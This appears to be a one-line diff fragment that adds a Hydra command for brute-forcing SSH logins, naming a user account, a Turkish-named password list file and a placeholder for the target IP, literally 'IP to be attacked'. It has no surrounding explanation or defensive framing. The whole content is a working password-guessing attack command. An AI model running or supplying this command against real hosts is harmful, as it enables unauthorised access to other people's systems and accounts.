@@ -1,0 +1,1 @@
+<hydra -l a.ali_07a -P parola_listesi.txt SALDIRI_YAPILACAK_IP -t 4 ssh
